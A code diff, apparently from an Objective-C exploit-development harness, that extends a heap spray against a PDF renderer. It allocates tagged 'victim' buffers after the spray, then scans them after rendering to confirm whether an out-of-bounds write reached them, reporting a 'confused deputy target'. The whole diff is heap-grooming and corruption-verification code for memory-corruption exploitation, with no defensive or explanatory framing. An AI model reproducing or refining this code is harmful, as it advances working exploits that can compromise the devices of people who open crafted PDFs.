@@ -1265,6 +1265,25 @@ cleanup:
                   @"  sprayed %d typed objs (len=0x%x tag=CFDA) x %zu  [live=%d holes=%d]",
                   got, OBJ_LEN, spraySz, live, holes]);
 
+    // ---- victim buffers: allocated AFTER spray, same size class ----
+    // These are the confused-deputy targets. Fill with distinct magic.
+    enum { NVICTIM = 256 };
+    void **victims = calloc(NVICTIM, sizeof(void *));
+    int nvic = 0;
+    for (int i = 0; i < NVICTIM; i++) {
+        void *v = malloc(spraySz);
+        if (!v) break;
+        // Fill with recognizable victim pattern: u32 vtag=0x56435449 'VICT', u32 idx, rest 0xBB
+        uint8_t *p = (uint8_t *)v;
+        for (size_t o = 0; o + 8 <= spraySz; o += 8) {
+            *(uint32_t *)(p + o) = 0x56435449;      // 'VICT'
+            *(uint32_t *)(p + o + 4) = (uint32_t)i;  // victim index
+        }
+        victims[i] = v;
+        nvic++;
+    }
+    scopeNote(r, [NSString stringWithFormat:@"  allocated %d victim bufs (tag=VICT) AFTER spray", nvic]);
+
     // ---- render (sigsetjmp crash-catch) ----
     NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
     if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
@@ -1387,14 +1406,43 @@ cleanup:
             }
         }
         done_oob:;
+
+        // ---- victim scan: did OOB write reach any victim buffer? ----
+        [r appendString:@"\n--- victim scan (tag=VICT after spray) ---\n"];
+        int vicHits = 0;
+        for (int i = 0; i < nvic; i++) {
+            uint8_t *v = victims[i];
+            if (!v) continue;
+            uint32_t *p = (uint32_t *)v;
+            size_t n = spraySz / 4;
+            for (size_t j = 0; j < n; j++) {
+                if (p[j] == 0x56435449) continue;  // intact VICT
+                vicHits++;
+                if (vicHits <= 6) {
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  VICTIM HIT: buf %d word %zu (off %zu)  0x56435449 -> 0x%08x",
+                        i, j, j * 4, p[j]]);
+                }
+                break;  // one report per victim
+            }
+        }
+        scopeNote(r, [NSString stringWithFormat:
+            @"  VERIFY VICTIM_HIT=%d / %d victims corrupted", vicHits, nvic]);
+        if (vicHits > 0) {
+            scopeNote(r, @"  >>> OOB WRITE REACHED VICTIM BUFFERS — confused deputy target accessible!");
+        } else {
+            scopeNote(r, @"  victims intact — OOB did not reach them this run (heap layout)");
+        }
     }
 
 cleanup:
     // Never free if hits — heap may be dirty
     if (hits == 0) {
         for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
+        for (int i = 0; i < nvic; i++) if (victims[i]) free(victims[i]);
     }
     free(bufs);
+    free(victims);
     return r;
 }
 
